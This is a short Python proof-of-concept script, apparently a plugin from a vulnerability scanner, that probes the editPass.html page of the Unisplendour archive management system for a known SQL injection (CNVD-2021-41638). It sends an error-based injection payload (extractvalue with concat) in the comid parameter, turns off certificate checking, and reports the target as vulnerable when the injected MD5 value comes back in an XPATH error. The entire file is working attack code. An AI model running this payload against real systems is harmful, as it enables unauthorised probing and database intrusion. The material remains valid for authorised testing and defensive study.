#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/v4HPcKAxhuG6YaQKwdKWxg',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '紫光档案管理系统 editPass.html SQL注入 CNVD-2021-41638',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=10,verify=False)
    if re.search(r'XPATH syntax error.*?c4ca4238a0b923820dcc509a6f75849.*?',res.text,re.S):
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret